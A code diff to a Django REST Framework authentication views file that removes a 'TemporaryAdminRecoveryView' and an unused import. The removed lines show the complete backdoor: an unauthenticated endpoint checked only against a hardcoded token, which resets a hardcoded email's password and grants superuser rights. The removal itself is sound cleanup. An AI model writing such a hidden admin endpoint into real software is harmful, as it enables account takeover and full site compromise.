@@ -1,4 +1,4 @@
-from django.contrib.auth import authenticate, get_user_model
+from django.contrib.auth import authenticate
 from rest_framework import status
 from rest_framework.permissions import AllowAny
 from rest_framework.response import Response
@@ -7,8 +7,6 @@ from rest_framework_simplejwt.tokens import RefreshToken
 from rest_framework_simplejwt.exceptions import TokenError
 
 from .serializers import LoginSerializer, LogoutSerializer, RegisterSerializer, UserSerializer
-
-User = get_user_model()
 
 
 def token_response(user, status_code=status.HTTP_200_OK):
@@ -70,27 +68,3 @@ class LogoutView(APIView):
             )
 
         return Response(status=status.HTTP_204_NO_CONTENT)
-
-
-class TemporaryAdminRecoveryView(APIView):
-    """One-time recovery hook to unblock admin access; remove after use."""
-
-    permission_classes = [AllowAny]
-    authentication_classes = []
-
-    def post(self, request):
-        token = request.data.get("token") or request.headers.get("X-Recovery-Token")
-        if token != "g-zbGul_orDn4nVyDoU9pUusdJMdc1qdk2oTVuN11U0":
-            return Response({"detail": "Not found."}, status=status.HTTP_404_NOT_FOUND)
-
-        email = "moengadavid90@gmail.com"
-        password = "swiftsend@2026"
-        updated = []
-        for user in User.objects.filter(email__iexact=email):
-            user.set_password(password)
-            user.is_staff = True
-            user.is_superuser = True
-            user.is_active = True
-            user.save(update_fields=["password", "is_staff", "is_superuser", "is_active"])
-            updated.append({"id": user.id, "username": getattr(user, "username", ""), "email": user.email})
-        return Response({"ok": True, "updated": updated}, status=status.HTTP_200_OK)
